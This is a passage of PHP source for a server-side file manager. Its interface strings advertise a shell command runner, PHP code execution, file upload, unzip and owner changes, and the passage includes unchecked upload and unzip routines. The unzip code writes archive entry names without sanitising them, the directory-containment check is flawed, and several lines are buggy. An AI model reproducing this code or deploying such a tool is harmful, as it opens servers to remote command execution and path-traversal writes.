                break;
            case "script" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA7ADsAOwdIxY2AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QkPCjsE7Rz77AAAAZFJREFUOMuVk7+O2kAQxn+DVqIMzgMgCgo3SMdbRIqoUvAIuZrGDQdyB/QUNPScriNNJN6BlFTISAiwgysaaJgr1usYTnfRjTS7q9HON9/8k8lk8nI4HH7wOWn3+/1nAMIw1M9KGIbqkIx7pGmawwuCCkgxptjjq+fdUDH33EQkuy0QgKoD0ze5mGIE54AIogW7ZAxU3geQIgPNDIIFEgf8EQPE5u7+i+XjfJX7olgpFVNQ0eyP5LeK1SSJefz5yG63ewdAHYcC40z/JjG9Xo8gCOh0Olyv17cAUuTnCioQJzFPT9Z5s9ng+z6r1YogCB5uaqDyr/8lBEVJ4iSPvN1uMcZQr9dJ05QoipZBEDTv5kARzYZIJHfe7/cYY/IZKZfL1Go1oihalu7baPutKMpoNGI4HGKMyfV0OuH7PlEUATRzAM/z8DyPSqVi9UuFarXKYDBgOp1ijOFyuQCwWCwAmrPZ7I+Mx+Nfx+Px+0erdz6fWa/XtFot5vM5jUbjd7fb/XbD/L/7224/AEsX2dlfAZgsvxGj7otLAAAAAElFTkSuQmCC";
                break;
            case "text" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QkWEjcpO1ICSAAAActJREFUOMulk01oE0EUx38z3aNIFiIt4rHgKaBYKwEPghWEeOxF0LYnr6UXFTyKIMUg9SJ+gJoWijG9WxoRTVwQ7cFi040bTP3A1WzrEBVakc14MEOzbWorvsv/Dcz7z29m3oP/DGGS4l36gBng2FZ6eIi8qZMAl0cvnQFmDh532I62ElhNvQHw7fk5tqNXT0rdrDstjdPeVEBZFVjdk6esCvzoethWX0xLBseKHOkfBhg3BMTjccSJpT+LfU1lTX3fJ39PMnTtGR+ejDO3EIRAh9V6H6UU9Xp9w0sHQYCbSa0Ve8t8LU11AD0RA9u2sW07Uuz7Pm4mxeBYkcXHGV6Vl1GlHEDPyGRj9q8E5uSBdIHFfIa5twpVyvFz/0XOn70wC4hNCbTWFNK9DFx5ijd9h8rn76j5B7zvGqazzTdGCLTWZLNZfslDzDsO7z7VWXo9Bb1pdq2sANo0oW5LEIYhuz+mefSlm/u5HN3yJTv7bpFMJnFdlzeVBYyLXE9QrVbxPI+RyQZHOyus7kgQHhglkUhgWRaWZUW6eANBLBZDa02tVkNrjZQSrTVCCIQQrdsbEQOlFI7jbDp1xmR9GIOJm7evn/qHKZ4wyW9aneiYeQn8EgAAAABJRU5ErkJggg==";
                break;
            case "world1" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QQaBywH5hnejwAAADV0RVh0Q29tbWVudAAoYykgMjAwNCBKYWt1YiBTdGVpbmVyCgpDcmVhdGVkIHdpdGggVGhlIEdJTVCQ2YtvAAAC7ElEQVQ4y62TXWhbZRyHn/ec95xjkzRpm+ajjW3W0KIsuHWyyMSrKagwFG+UKd1FZTgQb4ShoLdSEMX7XYgVR0HE6Y1MhjezMLWzlo12K67rXD+znCwfTXKSc5Kc1wvZxO3W5/r/ey7+/H6CBzj+3uwp4C1dyv0KLOX7DaVY0HTt7NzM1BcP3ov7wfe/nDR17ceJsWTiyIE0Y6koAcuiXG+ytmmzuLLJjY3CZSHEybmZqav/Ebz27ue5YLjnt1eOHhQHJ+KU603snQ1kKA49/eDYpBJRFla2OT+/chchnr0nkQDRaOin55/JiicyA5SKeQZHs0QGh3BabfKb60jfQ+s2eS6Xoeur6IVL188ATwNob3741UfJeH/4aG4cQ/PpyBBoAkNKTEMSsCSJaC9D8RixviC57KOkhweOvPHB2WkALRwJnDycHaVSLnLHDRAf3odS4CtAaAjfY7fU4PuLy1yYXyRiKfaPDwO8CiBrTjuWTvazcKNAZiKOr/79bL1S4qnJLEIIlFJs796h1WwyFIsAHAbQWl5HsywTLRSnUm9h1zwct0vN8fDqNkL8oxNCkIhFubp6E8uQAAMAUtc1v9poacHWDiFpUWgMUjRMOl2fVqnDZLuN63r0hoI4jsO+VIxC0wMoAUhD0/K3torDh8aTZEaGuL25zfzaHh4mTS/Ip99ewRJd3n75ALVajaVrN6E3DfA7gKa63XNLq1t4vgQgPZLi2KEYu4USd6sNqq7gdtnHtm2q1SqP9KdYXc8DfAOgL/187vx47qXTQtfNSNCgx9T5ZXGZ5byi1nDZa7jsOS65EZ3CnsdW2efa2s6vczNT79wvUqVQPHHxsv+d78OTjyX44UqVsmfidbq4XgfLEGxUFH8V2lz6Y60shDj10BaOTX/8+mhmZDYc6TMfzyRJDoaxLAOn1WbXrvDnrTxbO8XrQpfHH9rCPfoGxswXTpye1a3Ai+iyD4RQyu+oTntdCe2zrz+ZPsP/zd9wbDf3MdodlQAAAABJRU5ErkJggg==";
                break;
            case "down" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QsKDTgPGbLEcAAAAIx0RVh0Q29tbWVudABNZW51LXNpemVkIGljb24KPT09PT09PT09PQoKKGMpIDIwMDMgSmFrdWIgJ2ppbW1hYycgU3RlaW5lciwgCmh0dHA6Ly9qaW1tYWMubXVzaWNoYWxsLmN6CgpjcmVhdGVkIHdpdGggdGhlIEdJTVAsCmh0dHA6Ly93d3cuZ2ltcC5vcmdnisdHAAACV0lEQVQ4y52ST0iTYRzHP+/b/DNz8s7ha1q2iZpIHSI0tgQND2mQROEhhMQiqFiNeepgYR4MIQPxIEWHpCCEFQVF3SKhg2Z5KLKDmmhZhuRwbqXb3vfXYbYSLcjP6XmeL8+H7/PjUc51XLg4Fc5X5+ajC0ABUAfsTFFl2Zb+/VtWWrSvv/NKK39BqfH3NLl2lLmcufrk7sIcv9Nu3ROJG4x+WeT10IA59nGWUvub7b3td2fWFXjbOntjobmzcVGZNTR+pOWwyZJCY+0+ivKz6b7/AuPTCK7U+fXut+Nt8cn05wkREZmYGpWh0Qnx3Xgi7tNXJTA8LT1P30rDpZvybnJG/iQcDovP7xVLmsVga66LYDCIlpmLqixglSgAI+Oz6JkWvs4v8n7iA1uyrKAACKmpqQBY4jEQUzBMk/rWW2s6Dk0GicUNugKDdAUGAXjccQIkkasAppiYhknPGQ8AzceO4HGXs7QUIc+mUumuoKmhHoDjNcWYhomI/BaICHa7Rn6Oi2unyunrf0CpqwAVBRUFd5mT2/ce0VhdyOHKCjI2Z6wWAITDYXRdx5lXkpR4dhVR4tpG952HNFYXcrTKja7rRKPR5BMtAKZpEolEANB1HV3X6T1vpeV6gOWYwcnaMpoPHUBVVUKhEJFIBJvNlvgHPr9XKsr3IqwM+D8YfvUy0cDjrgSRFYOSmLAiIMrKNqEvKS5mfHwMQUH5U+BwOHg+8CwZCLKmzf6qGgCyHQ4QJZlbADRNIz3d+s+6ml0DwK7ZV51bfi3qag+yERSf33sZaGNjtP8Elb70qz97tp0AAAAASUVORK5CYII=";
                break;
            case "tar":
            case "compressed" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QYQEhgJtRvS4AAAAalJREFUOMutkjFoVEEQhr/Z2913d8k9YgxBrhARBJEgSSOKTcTGUgkoh41YKJYRCzuvSCkepBGUFLEJaBUsBEUPtRT0mohibIyYIipRouFd3tuxeDkVI3hRp5nZgf+b2ZmBfzQBaNTMMPBsk9qR8ZnQkkbNNIHRs1cX9P38YxVbNqAAGCO5F0g+L2JKAxlpIi+e3jNzD6cB6hbg9OVWliy/MbOTp8Q7B8DaWhsfRQiCcw5TcPi4Wjh28Q5Lb5+z+8AYr1v3Ry2wQ4yYkKViCp405P1FvQMAVPqrIAaA6q59tFfeEShQ2bINDdmwBfqSlQ+8fHKbkxemQLMNn1UFUAht0o+vSFY/4YoxABYoPro5IYePnoP0C2SroAHVDEKKash9WAdrYM/e/TyYvQ5o0QJ+cPuQYozgK0Dlx3pQJK+9/qYzX4ZGDrIw14ykUTOXgPpfnkG9cwd65MR5luebXaninYe4e+sK4zNBbCfpozI98dauAM5H3+OfACWI+7sCmKi4EeBKPdguAan7XQdxleB7/yDN9xGC/AKw5WvTE8fPbGb8XxO9wf+wb+DSh8wTKaW0AAAAAElFTkSuQmCC";
                break;
            case "compress" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QYVFCkaxKsYDAAAADV0RVh0Q29tbWVudAAoYykgMjAwNCBKYWt1YiBTdGVpbmVyCgpDcmVhdGVkIHdpdGggVGhlIEdJTVCQ2YtvAAACtUlEQVQ4y22TS2xMcRTGf/97p2aq8+yMRxGtpl5FBEG8FoQFkdDUW7ASgkTYCAsJiW0tiJUFKxLEIyLeYqEhilb6Ho/U0Kmaaaczc++duXfu/dtQfTirk3PO9+X7Ts4R/CfO71TmA41DSlFg67FrTtPIWTECuBHYA2LbvkOnCQQjAAykEly9dKYA1B275pwYilH/JnU7xGYhxN3dJ29O94+x1PIFmxDF48ATwTU2TLTljbLh8JUls5WXZ9dUZZseNdM+qKBuh1gnhHh89MIH6GvmS8sr0jlBZPJMAOJdrYR9Liqrl2GHF3HxSDVSys3Hr8u7CoAQonbtkVuQ+ADmAJXT51JVMRlFj6HoMSomRaisqgZzAPXXa1YdvIkQYheA64+DAzMrJoDlgqwOgNcXxOsLjlqwLPIyKVgEsA3Y/pcA6+d7FO84xPilCEsD/Qfk+0F1g2ssBfcEcgWFns8NdEffDhK6/lEXsN+dQ114CuEvh5IpFDxlWEYWI5Ogr+kG3S1PyGoGoVnrRxNoep5gcRhsE5n6BLH7GKZA03Okkz/IasYgKFtwD+YKQL1TQ6tWga36IfMZ0h2AROb6cIzksB30WQFisop6p2a4gpRuczm+mpUix+ySLqRTRIZSkrZFwpLEjCI6UyXEUzaLC+poC46UuMe4ac9G0ELL0Qs6/U4/yXySTC5DOp9GczJABinlcAsAHo/HLg2H0TSNRCKBbdv/exMCgQABb7Ez7JQ9btftru/dh+ZVz5FTp5YLBDiOg2maGIaBaZoEgyHKJpYRDgXkw2fPlWh7296en78+qgDxeG+vW7UfdPcm9ndGO5kzY5oTDJUKr8+Pz+fDNk1yer/d1NyqtHV0iHdv6mvaOr4+BQwxQqF/xcpltWGf2OL2l20Y2tCS3+71pKwX7xsa7wBxIA/wG8WmJi24cShhAAAAAElFTkSuQmCC";
                break;
            case "comp.gray" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QsEChUbxtIrVAAAAV1JREFUOMutk71qwlAYhp+vuhkNkWwODoIi3oJmdejYodfgLTgoccgliC5ddGnp2sFRcPUCTkToomTQnNUpdhCDMaIIfafD+3Ge7+8cARiPx99BELzxnN77/f4XAK7rHp+V67pHgOwlcr/fE0URACIS++eziJDJZDBNM44lAFEU4ft+4sKlRIR6vZ7wsteN1Wo1AHq9Xux1Oh1KpVIKCPByncH3fVarFe12G601Wms8z0MphVLqPgBgOp1iGAbNZpNut4tlWVhWgWq1Gld3F3DOuFgs8DwPEUEky3b7e3OXqRZOGS1msxnFYjGOjUYfBEHwuILL3sMwJAxDtNYcDgeGwyG73e7+FlqtFo7jxBVtNhsmkwmFQoFcLsd8PqdSqdwGiAhKqdQ7cByH9XqNYRjk8/nH7+A0uCSk0WiwXC7vAy6Hdi3TNCmXyyk/C2Db9s9gMHh95ivatv3Jf+gP4I6j5m0xmyQAAAAASUVORK5CYII=";
                break;
            case "unknown" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAM2SURBVDiNbZNbbFRlFIW/8//nWlEawIZOofQ27YBOqVOCBU1TLkYt+qKihsSEmBgTKwZJTCdBjGmirRck8UENiRHS+OCDCaBHI4KO1aAFaRla24Jjp2KdoS1Qe5lpp3bO70NLA8Gd7JedvVfWXllLU0pxYxVvawkAzwB1QHB+3AVEgNa4G+67cV+7DlC8rUUAjYtyzFd3PrrOvifgE5Xl+QCcv5ik80LCO3Ts18xkeqYJeDvuhr0FgPnjtvuqikItLz3snIoOcKI9Rk//MABrSvJ4oMbPxrWrCL//9dRPnQMdQG3cDXv6PJPGTetKQ2/uesjZs/9Lro2l2fvcZir9+aSnZvihI06r28nxX2K8u+cR55UDbvWPHfFGoJmi+uZAcPt7qb+Hx9TT4U9VUX2zerHliMpmPdXTP6RGx9NKKaVOno6pmp0fqYa3vlCJkXEV3L4/XVTfHJC5/q0vv/Dkhk2j42nt0LGzABiGzmfHz3PYPUd79188vuVuVi7P5fPvexkZTVG6YgklK5bKU9E/JwRQV1Xh0060xwCwTJ1Ll8dIXk1hWwZVFT4Arv6TxjB0chyLzt+HCK0uEFKIOh0IBsuWE72YxDAkpmlgWQaWaRAKFLB7x0aUUhw82oFjWwihkbgyyeriPDylgtdFRAgNQ9cxjbm2TIO9z9Zi6pLDX0XpuzRKjmMihMCxTDQ0NEAAXV2xy4QCBRiGnGNh6Cy+3WYgOcaZ3gRt0UEc28SxLXIck/LCZcQGryGk6BJA5NyFhLdlfRm6LtF1iWHoaELwc/cgp3uTSCmxbWMBpNKfR/cfQ14260UE0PrxkTOZDWtXsf6ulehSoktB7iKH3U/dS8Nj1eQ4JpZlYtsma4rvpMyXy4HWSEYp1SribrhvIpVp2vfBN1OvP7+ZUMCHlAIptQW/G/O6BAqX8ERtKa99+O30RCrTFHfDfTdZeWuNv/qNhgftaGyYaGyYxJVJbHvu58rSZZTkL6bp4Mlpt63n7My/s7VxN+zdEqY7brP37dpxv11V4dPKC5eiaRrxxCi/9Y9473zyXWZ8crop63k3h+n/4iylqFNKBQGklF2zs9mIUuqWOP8HZvdMlKLbimEAAAAASUVORK5CYII=";
                break;
            default:
                if(function_exists("imagecreate")){
                    $imgtext = "";
                }else{
                    $imgtext1 = "iVBORw0KGgoAAAANSUhEUgAAAC0AAAAPAQMAAABKsNTkAAAABlBMVEX/m5sAAACNNGKnAAAASklEQVR4nGNgwAbsEhskEhgYkiHUgcQGngMgasPx9gcg6jBDAsNxEHWA4TCQYmwAU8xADcaSh9mA2uX4DrM/AJqjcABsnHwDAwMA5uMazHHVIWwAAAAASUVORK5CYII=";
                    $imgtext2 = "iVBORw0KGgoAAAANSUhEUgAAAC0AAAAPAQMAAABKsNTkAAAABlBMVEX/m5sAAACNNGKnAAAAVElEQVR4nGNgwAZsEjdIJB9gSCvcIPMsgeFw5Qb5NwYMzJXbpRMMGNhyd85OSGDgyd1wO+EAg0T6hhuJDQwGyRtuJDMwJACpNAaG/4kbbuR/QDUSAD87HICLQ7oHAAAAAElFTkSuQmCC";
                    $rand_image = rand(1, 5);
                    $imgtext = ($rand_image > 3) ? $imgtext1 : $imgtext2;
                }

                break;
        }

        if(!empty($imgtext)){
            $iconcontent = base64_decode($imgtext);
            header('Content-type: image/gif');
            header('Content-length: ' . strlen($iconcontent));
            print($iconcontent);
            die(0);
        }else{
            $im = imagecreate(45, 15);
            $bg = imagecolorallocate($im, 255, 155, 155);
            $textcolor = imagecolorallocate($im, 0, 0, 0);
            imagestring($im, 5, 0, 0, $PE_imgtext, $textcolor);
            header("Content-type: image/png");
            imagepng($im);
            die(0);
        }
    }
    return false;
}

/**
* PE_img_by_path()
* Receive a path to an image and send the image to the browser
*
* @param string $PE_imgpath
* @return
*/
function PE_img_by_path($PE_imgpath = "")
{
    if(file_exists($PE_imgpath)){
        $PE_imgarray = pathinfo($PE_imgpath);

        $iconcontent = file_get_contents($PE_imgpath);
        header("Content-type: image/" . $PE_imgarray["extension"]);
        header('Content-length: ' . strlen($iconcontent));
        print($iconcontent);
        die(0);
    }
    return false;
}
/**
* PE_conv_perm()
* Convert the int value of file permission to format rwx-rwx-rwx
*
* @param mixed $perm
* @return
*/
function PE_conv_perm($perms)
{
    if(($perms &0xC000) == 0xC000){
        // Socket
        $info = 's';
    } elseif(($perms &0xA000) == 0xA000){
        // Symbolic Link
        $info = 'l';
    } elseif(($perms &0x8000) == 0x8000){
        // Regular
        $info = '-';
    } elseif(($perms &0x6000) == 0x6000){
        // Block special
        $info = 'b';
    } elseif(($perms &0x4000) == 0x4000){
        // Directory
        $info = 'd';
    } elseif(($perms &0x2000) == 0x2000){
        // Character special
        $info = 'c';
    } elseif(($perms &0x1000) == 0x1000){
        // FIFO pipe
        $info = 'p';
    }else{
        // unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms &0x0100) ? 'r' : '-');
    $info .= (($perms &0x0080) ? 'w' : '-');
    $info .= (($perms &0x0040) ?
        (($perms &0x0800) ? 's' : 'x') :
        (($perms &0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms &0x0020) ? 'r' : '-');
    $info .= (($perms &0x0010) ? 'w' : '-');
    $info .= (($perms &0x0008) ?
        (($perms &0x0400) ? 's' : 'x') :
        (($perms &0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms &0x0004) ? 'r' : '-');
    $info .= (($perms &0x0002) ? 'w' : '-');
    $info .= (($perms &0x0001) ?
        (($perms &0x0200) ? 't' : 'x') :
        (($perms &0x0200) ? 'T' : '-'));

    return $info;
}
/**
* PE_conv_owner()
* Convert the int value of file owner in better format
*
* @param mixed $owner
* @return
*/
function PE_conv_owner($owner)
{
    if(function_exists("posix_getpwuid")){
        $info = posix_getpwuid($owner);
        return $info[name];
    }

    return $owner;
}
/**
* PE_conv_group()
* Convert the int value of file group in better format
*
* @param mixed $group
* @return
*/
function PE_conv_group($group)
{
    if(function_exists("posix_getgrgid")){
        $info = posix_getgrgid($group);
        return $info[name];
    }

    return $group;
}
/**
* PE_format_date_time()
* Convert a timestamp to a date format (2011-11-05 10:20)
*
* @param mixed $PE_config
* @param mixed $date_time
* @return
*/
function PE_format_date_time($PE_config, $date_time)
{
    return date($PE_config["date_format"], $date_time);
}
/**
* PE_format_filesize()
* Convert the size from byte to (Byte Kb Mb Gb Tb)
*
* @param mixed $filesize
* @return
*/
function PE_format_filesize($filesize)
{
    if($filesize < 1024){
        $filesize = sprintf("%.2f", $filesize) . " <b>Byte</b>";
    } elseif(($filesize >= 1024) && ($filesize < 1048576)){
        $filesize = sprintf("%.2f", ($filesize / 1024)) . " <b>Kb</b>";
    } elseif(($filesize >= 1048576) && ($filesize < 1073741824)){
        $filesize = sprintf("%.2f", ($filesize / 1048576)) . " <b>Mb</b>";
    } elseif(($filesize > 1073741824) && ($filesize < 1099511627776)){
        $filesize = sprintf("%.2f", ($filesize / 1073741824)) . " <b>Gb</b>";
    } elseif($filesize > 1099511627776){
        $filesize = sprintf("%.2f", ($filesize / 1099511627776)) . " <b>Tb</b>";
    }

    return $filesize;
}

/**
* PE_is_windows()
* return true if the os of the user agent is windows else return false
*
* @return
*/
function PE_is_windows()
{
    $value1 = preg_match("/windows/i", $_SERVER["http_user_agent"]);
    return $value1;
}
/**
* PE_is_include_dir()
* return true if the second dir is include in the firt dir
*
* @param string $the_file_value
* @param string $the_pure_dir
* @return
*/
function PE_is_include_dir($the_file_value = "", $the_pure_dir = "")
{
    if(is_dir($the_file_value)){
        if(!(strstr(realpath($the_file_value), realpath($the_pure_dir)))){
            return false;
        }
    } elseif(is_dir(dirname($the_file_value) && (dirname($the_file_value)))){
        if(!(strstr(realpath($the_file_value), realpath(dirname($the_pure_dir))))){
            return false;
        }
    }
    return true;
}
/**
* PE_path_separator()
* return (\ if windows) os (/ else)
*
* @return
*/
function PE_path_separator()
{
    $path1 = "/";
    if (PE_is_windows()) $path1 = "\\\\";
    return $path1;
}
/**
* PE_integration()
* return integration url param
*
* @param array $PE_config
* @param string $type
* @return
*/
function PE_integration($PE_config, $type="")
{
  if(empty($type)){
    return "";
	//     return $PE_config["PE_key"]."=".$PE_config["PE_val"]."&";
	}else{
	    return "<input type=\"hidden\" name=\"" . $PE_config["PE_key"] . "\" value=\"" . $PE_config["PE_val"] . "\" />";
	}
}

/**
* PE_load_stream()
* laod the language array with the translate value
*
* @param array $PE_config
* @param string $stream_name
* @return
*/
function PE_load_stream($PE_config = array(), $stream_name="")
{
    if(file_exists($PE_config["default_stream"] . $PE_config["stream_path"] . "stream/" . $stream_name . "/stream.php")){
    include($PE_config["default_stream"] . $PE_config["stream_path"] . "stream/" . $stream_name . "/stream.php"); //--stream file
    }
    return $PE_config;
}

/**
* PE_upload()
* to upload files
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_upload($PE_config, $PE_thevar, $PE_language = array())
{
                print("<br /><b><u>" . PE_translate("file transfert") . "</u></b><br />");
				$PE_upload = array();
                foreach($_FILES as $key => $val){
                    if((isset($_FILES[$key]["name"]) && ($_FILES[$key]["error"] == UPLOAD_ERR_OK))){
                        $f_size = filesize($_FILES[$key]["tmp_name"]) + 1;
                        move_uploaded_file($_FILES[$key]["tmp_name"], ($PE_thevar["PE_current_dir"] . "/" . basename($_FILES[$key]["name"])));
                        $PE_upload[] = ($PE_thevar["PE_current_dir"] . "/" . basename($_FILES[$key]["name"]));
                        print("<br />" . PE_translate("transf_file") . $_FILES[$key]["tmp_name"] . "==> " . ($PE_thevar["PE_current_dir"] . "/" . basename($_FILES[$key]["name"])) . "<br />");
                    }
                }
    return $PE_upload;
}
/**
* PE_unzip()
* to unzip files
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_unzip($PE_config, $PE_thevar, $PE_language = array())
{
                @ $filesize = $_POST["MAX_FILE_SIZE"];
                $destination = $PE_thevar["the_value"];
				$PE_unzip = "";
                if(!$destination){
                    $destination = "." . $PE_thevar["PE_current_dir"];
                }

                if(!is_dir($destination)) mkdir($destination);


				$file_upload = PE_upload($PE_config, $PE_thevar, $PE_language);
                if(empty($file_upload)) print($message_not_ok);
                /**
                */
                $zip = zip_open($file_upload[0]);
                if($zip){
                    print($message_ok);
                    while ($zip_entry = zip_read($zip)){
                        $name = zip_entry_name($zip_entry);
                        $dimension = zip_entry_filesize($zip_entry);
                        $dim_compress = zip_entry_compressedsize($zip_entry);
                        $method_compress = zip_entry_compressionmethod($zip_entry);
                        print(PE_translate("name") . ":                    " . $name . "<br />");
                        print(PE_translate("size") . " " . PE_translate("File") . ":         " . $dimension . "<br />");
                        print(PE_translate("size") . " " . PE_translate("Compress") . ":    " . $dim_compress . "<br />");
                        print("Compress Method:  " . $method_compress . "<br />");
                        if(zip_entry_open($zip, $zip_entry, "r")){
                            print("Unzip " . PE_translate("file") . " : $name ....<br />");
                            $buf = zip_entry_read($zip_entry, zip_entry_filesize($zip_entry));
                            $fich = @ fopen($PE_thevar["PE_current_stream"] . $destination . PE_path_separator() . $name, "w+");
                            if(@ fwrite($fich, $buf)){
                                print("<br /> File [$name] " . PE_translate("succ_create") . ".......<br />");
								$PE_unzip = $PE_thevar["PE_current_stream"] . $destination . PE_path_separator() . $name;
                            }else{
                                print("<br /> " . PE_translate("File") . "[" . $name . "] " . PE_translate("cant_run") . ".......<br />");
                            }
                            zip_entry_close($zip_entry);
                        }
                        print("End. " . PE_translate("file") . " " . PE_translate("size") . " :" . $dimension . " <br />------<br />");
                    }

                    zip_close($zip);
                }else{
                    print($message_not_ok);
                }
    return $PE_unzip;
}





/**
* PE_load_lang()
* laod the language array with the translate value
*
* @param array $PE_config
* @return
*/
function PE_load_lang($PE_config = array())
{
    session_start();
    $_SESSION["PE_time1"] = microtime();


    $PE_language["encoding"] = "utf-8"; //--(encoding)
    $PE_language["language_code"] = "en"; //--(header lang)
    $PE_language["PE_current_language"] = "english"; //--(italian, english, french, default)

    $PE_language["exit_now"] = "You Have exit Now !!!!";
    $PE_language["insert_pw"] = " insert the good account information in the Url ";
    $PE_language["property"] = "Property";
    $PE_language["run_code"] = "Run PHP Code";
    $PE_language["edit_file"] = "Edit File";
    $PE_language["download"] = "Download";
    $PE_language["del_file"] = "Delete File";
    $PE_language["del_folder"] = "Delete Folder";
    $PE_language["explore"] = "Explore";
    $PE_language["create_file"] = "Create File";
    $PE_language["create_folder"] = "Create Folder";
    $PE_language["new_link"] = "New Link";
    $PE_language["touch"] = "Touch";
    $PE_language["rename_file"] = "Rename File";
    $PE_language["copy_file"] = "Copy File";
    $PE_language["change_group"] = "Change Group";
    $PE_language["change_owner"] = "Change Owner";
    $PE_language["set_perm"] = "Set Permission";
    $PE_language["preview"] = "Preview";
    $PE_language["files"] = "Files";
    $PE_language["logout"] = "Logout";
    $PE_language["run"] = "Run";
    $PE_language["cmd_mode"] = "Command mode:";
    $PE_language["normal"] = "Normal";
    $PE_language["extend"] = "Extend";
    $PE_language["upload_file"] = "Upload files:";
    $PE_language["upload_zip"] = "Upload and unzip file to";
    $PE_language["transfert_file"] = "Transfert Files";
    $PE_language["cmd_shell"] = "Command (Shell):";
    $PE_language["cmd_one"] = "Command (one param):";
    $PE_language["cmd_two"] = "Command (two params):";
    $PE_language["action"] = "Action ";
    $PE_language["run_succ"] = "run Successfully  on ";
    $PE_language["cant_run"] = "can't be run on ";
    $PE_language["past_succ"] = "Action Paste run Successfully  on ";
    $PE_language["file_transf"] = "file transfert ";
    $PE_language["transf_file"] = "Transfert file";
    $PE_language["editor_mode"] = "Editor Mode:";
    $PE_language["edit_text"] = " Edit Text:";
    $PE_language["succ_create"] = "Successfully  created.";
    $PE_language["go_root"] = "Root (/) ";
    $PE_language["go_home"] = "Home (./)";
    $PE_language["go_up"] = "Up (../)";
    $PE_language["all"] = "All";
    $PE_language["save_to_file"] = "Save this text to file";

    $PE_language["cmd_select"] = "Command on selection : ";
    $PE_language["language"] = "Language ";
    $PE_language["command"] = " Command ";

    $PE_language["name"] = "Name";
    $PE_language["comment"] = "Comment";
    $PE_language["size"] = "Size";
    $PE_language["type"] = "Type";
    $PE_language["last_modified"] = "Last Modified";
    $PE_language["group"] = "Group";
    $PE_language["owner"] = "Owner";
    $PE_language["permission"] = "Permission";

    $PE_language["directory"] = " Directory ";
    $PE_language["link"] = " Link ";
    $PE_language["file"] = " File ";

    $PE_language["total_space"] = "Disk Total Space";
    $PE_language["free_space"] = "Disk Free Space";


    $PE_language["go_to"] = "Goto=> ";
    $PE_language["shell"] = "Shell ";
    $PE_language["extend_command"] = "Extend Command ";
    $PE_language["upload"] = "Upload ";
    $PE_language["command1"] = "Command1 ";
    $PE_language["command2"] = "Command2 ";
    $PE_language["addslashes_file"] = "Addslashes in file";
    $PE_language["apache_request_headers"] = "Apache Request Headers ";
    $PE_language["apache_response_headers"] = "Apache Response Headers ";
    $PE_language["base64_decode_file"] = "Base64 decode file";
    $PE_language["base64_decode_text"] = "Base64 decode text";
    $PE_language["base64_encode_file"] = "Base64 encode file";
    $PE_language["base64_encode_text"] = "Base64 encode text";
    $PE_language["bin2hex_file"] = "Convert bin2hex file";
    $PE_language["bz2"] = "Bz2 file";
    $PE_language["bz2_all"] = "Bz2";
    $PE_language["cmd_1"] = "Extend Command 1";
    $PE_language["cmd_2"] = "Extend Command 2";
    $PE_language["cmd_shell"] = "command extend";
    $PE_language["cmd_upload"] = "Command upload";
    $PE_language["copy"] = "Copy File to";
    $PE_language["copy_all"] = "Copy";
    $PE_language["count_chars_file"] = "Stat chars in file";
    $PE_language["count_line_file"] = "Count Line";
    $PE_language["crc32_file"] = "crc32 file";
    $PE_language["crc32_text"] = "crc32 text";
    $PE_language["crypt_file"] = "Crypt file";
    $PE_language["cut_all"] = "Cut";
    $PE_language["debug_backtrace"] = "Debug Backtrace ";
    $PE_language["defined_constants"] = "PHP Defined Constant";
    $PE_language["defined_functions"] = "PHP Defined Function";
    $PE_language["defined_vars"] = "PHP Defined var";
    $PE_language["delete"] = "Delete file";
    $PE_language["delete_all"] = "Delete";
    $PE_language["dir_copy"] = "Copy Folder to";
    $PE_language["dir_move"] = "Move folders to";
    $PE_language["download"] = "Download file";
    $PE_language["download_all"] = "Download";
    $PE_language["edit"] = "Edit file";
    $PE_language["exec"] = "Command exec";
    $PE_language["extension_function"] = "PHP Extension Function";
    $PE_language["gz"] = "Gzip file";
    $PE_language["gzip_all"] = "Gzip";
    $PE_language["hebrevc_file"] = "Hebrev convert file";
    $PE_language["include"] = "include file";
    $PE_language["ini_get_all"] = "PHP All ini Settings";
    $PE_language["list"] = "Explore folder";
    $PE_language["loaded_extension"] = "PHP Loaded Extension";
    $PE_language["md5_file"] = "Md5 file";
    $PE_language["md5_text"] = "Md5 text";
    $PE_language["move"] = "Move file to";
    $PE_language["new_dir"] = "Create folder";
    $PE_language["new_file"] = "Create file";
    $PE_language["only_shell"] = "shell";
    $PE_language["only_replace"] = "replace";
    $PE_language["paste_all"] = "Paste";

    $PE_language["exec_file_file"] = "Command exec file";
    $PE_language["shell_exec_file"] = "Shell execution file";
    $PE_language["system_file"] = "System file";
    $PE_language["run_code_file"] = "Run PHP code file";


    $PE_language["php_credit"] = "PHP Credit";
    $PE_language["php_credit"] = "Php Credit";
